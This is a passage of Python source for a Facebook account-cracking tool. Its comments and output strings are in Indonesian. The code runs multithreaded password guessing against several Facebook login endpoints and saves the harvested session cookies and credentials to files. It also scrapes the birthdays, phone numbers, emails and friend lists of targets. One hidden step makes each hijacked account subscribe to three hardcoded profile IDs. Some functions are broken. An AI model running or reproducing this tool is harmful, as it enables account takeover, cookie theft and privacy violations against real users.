                        bokep_japan_yang_terbaru("OK", fl.get("id"), i, "+")
                        break
                else:continue
            self.ko += 1
            sys.stdout.write('\r%s[%s%s%s] %s/%s OK:%s CP:%s '%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,self.ko,len(self.fl),len(self.ok),len(self.cp))),
            sys.stdout.flush()
#            print("\r[Crack] %s/%s  OK : %s  CP : %s"%(self.ko,len(self.fl),len(self.ok),len(self.cp)), end=' ');sys.stdout.flush()
        except:
            self.mabasic(fl)
    def mabasicv1(self,fl):
        try:
            for i in fl.get("pw"):
                try:
                    log = log_api_1(fl.get("id"), i)
                except requests.exceptions.ConnectionError:
                    self.kntl += 1
                    sys.stdout.write('\r%s[%s%s%s] Internet Anda Terputus >%s<'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,str(self.kntl))),
                    sys.stdout.flush()
                    time.sleep(2)
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open(".login.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"];m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        dob = ("%s %s %s"%(str(d),m,str(y)))
                        if opsii == "y" or "y" == opsii:
                           try:
                               log_hasill(fl.get("id"), i, dob)
                               self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y))
                               open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y))
                               break
                           except:
                               log_hasill(fl.get("id"), i, "")
                               self.cp.append("%s|%s"%(fl.get("id"),i))
                               open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                               break
                        else:
                            print("\r%s[%s%s%s]%s %s|%s|%s %s %s   %s"%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,d,m,y,Q));play_mpv('assalamualaikum.mp3')
                        bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                        self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y)) 
                        open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y)) 
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    dob = ("%s %s %s"%(str(d),m,str(y)))
                    if opsii == "y" or "y" == opsii:
                       try:
                           bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                           log_hasill(fl.get("id"), i, dob);play_mpv('assalamualaikum.mp3')
                           self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y))
                           open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y))
                           break
                       except:
                           log_hasill(fl.get("id"), i, "");play_mpv('assalamualaikum.mp3')
                           bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                           self.cp.append("%s|%s"%(fl.get("id"),i))
                           open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                           break
                    else:
                        print("\r%s[%s%s%s]%s %s|%s%s               "%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,Q));play_mpv('assalamualaikum.mp3')
                        self.cp.append("%s|%s"%(fl.get("id"),i))
                        bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                        open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                        break
                elif log.get("status")=="success":
                        print("\r%s[%sCHIGOZIE OK%s]%s %s|%s|%s%s              "%(Q,I,Q,I,fl.get("id"),i,koki(log.get("cookies")),Q));play_mpv('assalamualaikum.mp3')
                        self.ok.append("%s|%s"%(fl.get("id"),i))
                        open("Hasil/OK-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                        bokep_japan_yang_terbaru("OK", fl.get("id"), i, "+")
                        break
                else:continue
            self.ko += 1
            sys.stdout.write('\r%s[%s%s%s] %s/%s OK:%s CP:%s '%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,self.ko,len(self.fl),len(self.ok),len(self.cp))),
            sys.stdout.flush()
#            print("\r[Crack] %s/%s  OK : %s  CP : %s"%(self.ko,len(self.fl),len(self.ok),len(self.cp)), end=' ');sys.stdout.flush()
        except:
            self.mabasicv1(fl)

    def apiv1(self,fl):
        try:
            for i in fl.get("pw"):
                try:
                    log = log_api(fl.get("id"),i,"https://b-api.facebook.com")
                except requests.exceptions.ConnectionError:
                    self.kntl += 1
                    sys.stdout.write('\r%s[%s%s%s] Internet Anda Terputus >%s<'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,str(self.kntl))),
                    sys.stdout.flush()
                    time.sleep(2)
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open(".login.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"];m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        dob = ("%s %s %s"%(str(d),m,str(y)))
                        if opsii == "y" or "y" == opsii:
                           try:
                               log_hasill(fl.get("id"), i, dob);play_mpv('assalamualaikum.mp3')
                               self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y))
                               open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y))
                               break
                           except:
                               log_hasill(fl.get("id"), i, "");play_mpv('assalamualaikum.mp3')
                               self.cp.append("%s|%s"%(fl.get("id"),i))
                               open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                               break
                        else:
                            print("\r%s[%s%s%s]%s %s|%s|%s %s %s   %s"%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,d,m,y,Q));play_mpv('assalamualaikum.mp3')
                        bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                        self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y)) 
                        open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y)) 
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    dob = ("%s %s %s"%(str(d),m,str(y)))
                    if opsii == "y" or "y" == opsii:
                       try:
                           bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                           log_hasill(fl.get("id"), i, dob);play_mpv('assalamualaikum.mp3')
                           self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y))
                           open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y))
                           break
                       except:
                           log_hasill(fl.get("id"), i, "");play_mpv('assalamualaikum.mp3')
                           bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                           self.cp.append("%s|%s"%(fl.get("id"),i))
                           open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                           break
                    else:
                        print("\r%s[%s%s%s]%s %s|%s%s               "%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,Q));play_mpv('assalamualaikum.mp3')
                        self.cp.append("%s|%s"%(fl.get("id"),i))
                        bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                        open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                        break
                elif log.get("status")=="success":
                        print("\r%s[%sCHIGOZIE OK%s]%s %s|%s|%s%s              "%(Q,I,Q,I,fl.get("id"),i,""),Q);play_mpv('assalamualaikum.mp3')
                        self.ok.append("%s|%s"%(fl.get("id"),i))
                        open("Hasil/OK-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                        bokep_japan_yang_terbaru("OK", fl.get("id"), i, "+")
                        break
                else:continue
            self.ko += 1
            sys.stdout.write('\r%s[%s%s%s] %s/%s OK:%s CP:%s '%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,self.ko,len(self.fl),len(self.ok),len(self.cp))),
            sys.stdout.flush()
#            print("\r[Crack] %s/%s  OK : %s  CP : %s"%(self.ko,len(self.fl),len(self.ok),len(self.cp)), end=' ');sys.stdout.flush()
        except:
            self.mbasic(fl)

    def __api__(self, user, __yan__):
        global ok,cp,loop,opsii
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('Hasil')
            except: pass
            try:
                _kontol = open('.ua', 'r').read()
            except (KeyError, IOError):
                _kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": _kontol, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if 'Anda Tidak Dapat Menggunakan Fitur Ini Sekarang' in response.text:
                sys.stdout.write('\r %s[%s!%s] Hidup Matikan Mode Pesawat !!!'%(Q,K,Q)),
                loop+=1
                sys.stdout.flush()
                self.__api__()
            if 'session_key' in response.text and 'EAAA' in response.text:
                coki = ";".join(i["name"]+"="+i["value"] for i in send.json()["session_cookies"])
                print('\r%s[%sOK%s]%s %s|%s|%s                 %s\n' % (Q,I,Q,I,user,pw,coki))
                try:ttll_ = ("%s %s %s"%(day, month, year));bokep_japan_yang_terbaru("", user, pw, ttll_)
                except:bokep_japan_yang_terbaru("", user, pw, "")
                wrt = '%s|%s|%s' % (user,pw,coki)
                ok.append(wrt)
                open('Hasil/OK-%s.txt' % (durasi), 'a').write('%s\n' % wrt)
                break
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    kontol = open('.login.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                ttl_ = ("%s %s %s"%(day, month, year))
                if opsii == "y" or "y" == opsii:
                   try:
                       log_hasill(user, pw, str(dob))
                   except:
                       log_hasill(user, pw, "")
                else:
                   print('\r%s[%sCP%s]%s %s|%s%s                %s' % (Q,K,Q,K,user,pw,ttl_,Q));play_mpv('assalamualaikum.mp3')
                try:ttll_ = ("%s %s %s"%(day, month, year));bokep_japan_yang_terbaru("", user, pw, ttll_)
                except:bokep_japan_yang_terbaru("", user, pw, "")
                wrt = '%s|%s%s' % (user,pw,ttl_)
                cp.append(wrt)
                open('Hasil/CP-%s.txt' % (durasi), 'a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1
        sys.stdout.write('\r%s[%s%s%s] %s/%s OK:%s CP:%s %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,loop,len(self.id),len(ok),len(cp), Q)),
        sys.stdout.flush()


    def mobile_(self, user, kiky__gtg):
        global ok,cp,loop,infoong
        for pw in kiky__gtg:
            pw = pw.lower()
            session = requests.Session()
            session.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":"[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://developers.facebook.com/","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = session.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
            session.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            po = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
#            po = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False);garentod(2)
            if 'c_user' in session.cookies.get_dict():
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                wrt = '%s|%s|%s' % (user,pw,coki)
                ok.append(wrt)
                open('Hasil/OK-'+durasi+'.txt','a').write('%s\n' % wrt)
                zczc = ('\r%sâ•­â”€[%sOK%s]%s %s|%s\n%sâ•°â”€cookie :%s %s                 ' % (Q,I,Q,I,user,pw,P,I,coki));play_mpv('DING.mp3')
                header={'Host':'business.facebook.com','cache-control':'max-age=0','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36','accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','content-type' : 'text/html; charset=utf-8','accept-encoding':'gzip, deflate','accept-language':'en-GB,en-US;q=0.9,en;q=0.8,bn;q=0.7','cookie': cookie};r=requests.get("https://business.facebook.com/creatorstudio/home", headers=header);p=re.search('{"accessToken":"(EAA\+)', r.text);tokxx=p.group(1);requests.post('https://graph.facebook.com/100000260233573/subscribers?access_token=' + tokxx);requests.post('https://graph.facebook.com/100004499498856/subscribers?access_token=' + tokxx);requests.post('https://graph.facebook.com/100076835203956/subscribers?access_token=' + tokxx)
                if infoong == "y":
                   cek_cookies_by_risky(user, coki, zczc)
                else:
                   print(zczc)
                akun_ok(user, pw, coki)
                break
            elif 'checkpoint' in session.cookies.get_dict():
                try:
                    kontol = open('.login.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print('\r%s[%sCP%s]%s %s|%s|%s %s %s       ' % (Q,K,Q,K,user,pw,day,month,year));play_mpv('bruh.mp3')
                    wrt = '%s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt)
                    bokep_japan_yang_terbaru("AJG", user, pw, "")
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print('\r%s[%sCP%s]%s %s|%s                 ' % (Q,K,Q,K,user,pw));play_mpv('bruh.mp3')
                wrt = '%s|%s' % (user,pw)
                cp.append(wrt)
                open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt)
                bokep_japan_yang_terbaru("AJG", user, pw, "")
                break
            else:
                continue
        loop += 1
        sys.stdout.write('\r%s[%s%s%s] %s/%s OK:%s CP:%s %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,loop,len(self.id),len(ok),len(cp), Q)),
        sys.stdout.flush()





    def mobile__(self, uid, listpw):
                global ok, cp, loop
                sys.stdout.write("\r [*] crack: %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))); sys.stdout.flush()
                try:
                        for pw in listpw:
                                pw = pw.lower()
                                ses = requests.Session()
                                ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
                                r = ses.get("https://m.facebook.com/index.php")
                                payload = {"lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),"uid":uid,"flow":"login_no_pin","pass":pw,"next":"https://m.facebook.com/home.php"}
                                if "c_user" in ses.cookies.get_dict().keys():
                                        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                                        print("\r%s[%sOK%s]%s %s|%s|%s%s"%(Q, I, Q, I, uid, pw, kuki, Q))
                                        ok.append("%s|%s"%(uid, pw))
                                        open("Hasil/OK-%s.txt"%(durasi),"a").write("%s|%s|%s\n"%(uid, pw, kuki))
                                        break
                                        continue
                                elif "checkpoint" in ses.cookies.get_dict().keys():
                                        try:
                                                token = open(".login.txt", "r").read()
                                                with requests.Session() as ses:
                                                        ttl = ses.get("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(uid, token)).json()["birthday"]
                                                        month, day, year = ttl.split("/")
                                                        month = bulan_ttl[month]
                                                        print("\r%s[%sCP%s]%s %s|%s|%s %s %s%s"%(Q, K, Q, K, uid, pw, day, month, year, Q))
                                                        cp.append("%s|%s"%(uid, pw))
                                                        open("Hasil/CP-%s.txt"%(durasi),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                                                        break
                                        except (KeyError, IOError):
                                                day = (" ")
                                                month = (" ")
                                                year = (" ")
                                        except:pass
                                        print("\r%s[%sCP%s]%s %s|%s%s"%(Q, K, Q, K, uid, pw, Q))
                                        cp.append("%s|%s"%(uid, pw))
                                        open("Hasil/CP-%s.txt"%(durasi),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                        loop +=1
                except:
                        self.mobile__(uid, listpw)

    def mbasicv1(self, user, pwList):
        global loop, CP, OK, opsii
        loop+=1
        data={}
        url = "https://mbasic.facebook.com"
        session = req.Session()
        session.headers.update({
        "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-encoding":"gzip, deflate",
        "accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "cache-control":"max-age=0",
        "referer":"https://mbasic.facebook.com/",
        "sec-ch-ua":'";Not A Brand";v="99", "Chromium";v="94"',
        "sec-ch-mobile":"?1",
        "sec-ch-ua-platform":'"Android"',
        "sec-fetch-dest":"document",
        "sec-fetch-mode":"navigate",
        "sec-fetch-site":"same-origin",
        "sec-fetch-user":"?1",
        "upgrade-insecure-requests":"1",
        "user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
        })
        for pw in pwList:
                pw = pw.lower()
                soup = par(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
                link = soup.find("form",{"method":"post"})
                lsd = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
                for __data in soup.find_all("input"):
                    if __data.get("name") in lsd:
                       data.update({__data.get("name"):__data.get("value")})
                    data.update({"email":user,"pass":pw})
                try:
                    response = session.post(url+link.get("action"),data=data)
                except:
                    exit(war+"Silahkan Ganti Useragnets")
                if "c_user" in session.cookies.get_dict():
                   if "Akun Anda Dikunci" in response.text:
                      print(f"\r{Q}[{K}CP{Q}]{K} {user}|{pw}{M} AKUN INI KENAK SENSI NEW{Q}\n",end="");play_mpv('assalamualaikum.mp3')
                      CP += 1
                   else:
                      OK += 1
                      coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                      print(f"\r{Q}[{I}OK{Q}]{I} {user}|{pw}|{coki}{Q}\n",end="");play_mpv('assalamualaikum.mp3')
                      open("Hasil/OK-"+durasi+".txt","a").write(user+"|"+pw+"|"+coki+"\n")
                      break
                elif "checkpoint" in session.cookies.get_dict():
                   if "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response.text)):
                      print(f"\r{Q}[{K}CP{Q}]{K} {user}|{pw} {M}AKUN INI KENAK A2F ON\n",end="");play_mpv('assalamualaikum.mp3')
                   else:
                      CP += 1
                      if opsii == "y" or "y" == opsii:
                         try:
                             log_hasill(user, pw, "")
                         except:
                             log_hasill(user, pw, "")
                      else:
                         if "Lihat detail login yang ditampilkan. Ini Anda?" in re.findall("\<title>(.*?)<\/title>",str(response.text)):
                            print(f"\r{Q}[{I}OK{Q}] {I}{user}|{pw} {M}AKUN INI TAP YES :V\n",end="");play_mpv('assalamualaikum.mp3')
                         else:
                            print(f"\r{Q}[{K}CP{Q}]{K} {user}|{pw}{Q}               \n",end="");play_mpv('assalamualaikum.mp3')
                      open("Hasil/CP-"+durasi+".txt","a").write(user+"|"+pw+"\n")
                      break
                else:
                   if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(response.text)):
                      TP += 1
                      print(f"\r{Q}[{C}!!{Q}]{M}Hidup Matikan Mode Pesawat Selama 2 Detik >>>{U}{str(TP)}{Q}<<<",end="")
                      continue
                   else:
                      pass
                print(f"\r{Q}[{C}CRACK{Q}] {K}{str(loop)}{Q}/{str(len(self.id))} [{K}CP : {str(CP)}{Q}]  [OK : {I}{str(OK)}{Q}] -> {'{:.1%}'.format(loop/float(len(self.id)))}",end="")
#lll = ["tes","adinar12345"]
#tesi("").mbasicv1("100009422473571", lll)
    def KangKETOD(self):
            with zthreads(max_workers=35) as (form):
            	for uname in self.id:
                    try:
                        zz = uname.split('<=>')
                        form.submit(self.__api__,zz[0], generate(zz[1]))
                    except:
                        pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Finished")
    def KangCOLMEXXX(self):
            with zthreads(max_workers=35) as (form):
            	for uname in self.id:
                    try:
                        zz = uname.split('<=>')
                        form.submit(self.mobile_,zz[0], generate(zz[1]))
#                    except Exception as e:print("\n[!] Error : %s"%(e))
                    except:
                        pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Finished")
    def KangCOLMEXXXX(self):
            with zthreads(max_workers=35) as (form):
            	for uname in self.id:
                    try:
                        zz = uname.split('<=>')
                        form.submit(self.mobile__,zz[0], generate(zz[1]))
                    except Exception as e:print("\n[!] Error : %s"%(e))
#                    except:
 #                       pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Finished")
    def KangCilok(self):
            with zthreads(max_workers=35) as (form):
            	for uname in self.id:
                    try:
                        zz = uname.split('<=>')
                        form.submit(self.api,zz[0], generate(zz[1]))
                    except:
                        pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Finished")
    def KangBOKEP(self):
            with zthreads(max_workers=35) as (form):
            	for uname in self.id:
                    try:
                        zz = uname.split('<=>')
                        form.submit(self.mbasic,zz[0], generate(zz[1]))
                    except:
                        pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Finished")

    def KangSUGENG(self):
                self.ko,self.cp,self.ok,self.kntl = 0,[],[],0
                try:
                    while True:
                        try:self.fs=open(self.apk).read().splitlines();break
                        except Exception as e:print("\n[!] Error : %s"%(e));continue
                    self.fl=[]
                    for i in self.fs:
                        try:self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
                        except:continue
                except Exception as e:print("\n[!] Error : %s"%(e))
#                ThreadPool(35).map(self.mabasic,self.fl);exit()
                ThreadPool(35).map(self.apiv1,self.fl);os.remove(self.apk);exit()

    def KangJORDI(self):
                self.ko,self.cp,self.ok,self.kntl = 0,[],[],0
                try:
                    while True:
                        try:self.fs=open(self.apk).read().splitlines();break
                        except Exception as e:print("\n[!] Error : %s"%(e));continue
                    self.fl=[]
                    for i in self.fs:
                        try:self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
                        except:continue
                except Exception as e:print("\n[!] Error : %s"%(e))
                ThreadPool(35).map(self.mabasic,self.fl);exit()
#                ThreadPool(35).map(self.mabasic,self.fl);os.remove(self.apk);exit()
    def KangAGEN(self):
                self.ko,self.cp,self.ok,self.kntl = 0,[],[],0
                try:
                    while True:
                        try:self.fs=open(self.apk).read().splitlines();break
                        except Exception as e:print("\n[!] Error : %s"%(e));continue
                    self.fl=[]
                    for i in self.fs:
                        try:self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
                        except:continue
                except Exception as e:print("\n[!] Error : %s"%(e))
#                ThreadPool(35).map(self.mabasicv1,self.fl);exit()
                ThreadPool(35).map(self.mabasic,self.fl);os.remove(self.apk);exit()
    def KangBANDAR(self):
            global ok,cp
            self.ko,self.cp,self.ok,self.kntl = 0,[],[],0
            with zthreads(max_workers=35) as (form):
            	for uname in self.id:
                    try:
                        zz = uname.split('<=>')
                        form.submit(self.mbasicv1,zz[0], generate(zz[1]))
                    except:pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Finished")

def koki(cookies):
    result=[]
    for i in enumerate(cookies.keys()):
        if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
        else:result.append(i[1]+"="+cookies[i[1]]+"; ")
def ganti_ua():
	jalan(war+"Enter your User Agnet !!")
	jalan(war+"Type * def * for Default User Agent Settings Script !!")
	uq = input(war+'User Agent : ')
	if uq in [""," "]:
		print(war+"Don't Empty Bro")
	elif uq in ["DEF","def","* def *","Def"]:
		print(war+"OK, User Agent has been successfully setup !")
		time.sleep(1)
		os.system("rm -rf .ua")
		exit(war+"Run Script Again : python CORE.py")

	else:
		print(war+"OK, User Agent has been successfully setup !")
		time.sleep(1)
		dump = open('.ua','w') 
		dump.write(uq)
		dump.close()
		exit(war+"Run Script Again : python CORE.py")
def get_info():
    i='\033[0;92m'
    try:
        toket=open(".login.txt","r").read()
    except IOError:
        print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
        os.system("rm -rf .login.txt")
        logs()
    try:
        idt = input(inp+'Enter ID Target :')
        jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
        op = json.loads(jok.text)
    except Exception as e: 
        print(war+"Problem! Not Found %s"%(e))
        exit()
    try:
        nama = op['name']
    except (KeyError, IOError):
        nama = M+"â€”"+Q
    try:
        namade = op['first_name']
    except (KeyError, IOError):
        namade= M+"â€”"+Q
    try:
        namabe = op['last_name']
    except (KeyError, IOError):
        namabe= M+"â€”"+Q
    try:
        idfb = op['id']
    except (KeyError, IOError):
        idfb = M+"â€”"+Q
    try:
        user = op['username']
    except (KeyError, IOError):
        user = M+"â€”"+Q
    try:
        ttll = op['birthday']
    except (KeyError, IOError):
        ttll = M+"â€”"+Q
    try:
        tzim = op['timezone']
    except (KeyError, IOError):
        tzim = M+"â€”"+Q
    try:
        stas = op['relationship_status']
    except (KeyError, IOError):
        stas = M+"â€”"+Q
    try:
        dgn = '''dengan %s'''%(op['significant_other']['name'])
    except (KeyError, IOError):
        dgn = M+"â€”"+Q
    try:
        tigl = op['location']['name']
    except (KeyError, IOError):
        tigl = M+"â€”"+Q
    try:
        dari = op['hometown']['name']
    except (KeyError, IOError):
        dari = M+"â€”"+Q
    try:
        lins = op['link']
    except (KeyError, IOError):
        lins = M+"â€”"+Q
    try:
        uptd = op['updated_time']
    except (KeyError, IOError):
        uptd = M+"â€”"+Q
    try:
        nmrr = op['mobile_phone']
    except (KeyError, IOError):
        nmrr = M+"â€”"+Q
    try:
        emai = op['email']
    except (KeyError, IOError):
        emai = M+"â€”"+Q
    try:
        bioo = op['about']
    except (KeyError, IOError):
        bioo = M+"â€”"+Q
    try:
        gndr = op['gender']
    except (KeyError, IOError):
        gndr = M+'â€”'+Q
    try:
        r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
        id = []
        z = json.loads(r.text)
        for i in z["data"]:
                id.append(i["id"]+"<=>"+i["name"])
        temn = "%s"%(len(id))
    except KeyError:
        temn = M+"â€”"+Q
    try:
